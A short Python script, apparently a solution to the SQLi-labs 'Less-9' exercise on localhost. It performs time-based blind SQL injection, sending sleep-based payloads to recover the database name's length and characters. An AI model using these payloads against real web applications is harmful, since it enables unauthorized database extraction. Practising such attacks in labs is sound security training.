import requests
import datetime
import time
def database_len():
    for i in range(1,10):
        url='''http://127.0.0.1/sqli/Less-9/'''
        payload='''?id=1' and if(length(database())=%d,sleep(2),1)''' %i
        #print(url+payload+' --+ ')
        time1=datetime.datetime.now()
        r=requests.get(url+payload+' --+ ')
        time2=datetime.datetime.now()
        l=(time2-time1).seconds
        if l>=2:
            print('database_len:',i)
            break
        #else:
        #    print(i)
        #    break
database_len()
def database_name():
    name = ''
    for j in range(1, 9):
        for i in '0123456789abcdefghijklmnopqrstuvwxyz':
            url = '''http://127.0.0.1/sqli/Less-9/'''
            payload = '''?id=1' and if(substr(database(),%d,1)='%s',sleep(2),1)''' % (j,i)
            time1 = datetime.datetime.now()
            r = requests.get(url + payload + ' --+ ')
            time2 = datetime.datetime.now()
            sec = (time2 - time1).seconds
            if sec >= 2:
                name += i
                print(name)
                break
    print('database_name:', name)
database_name()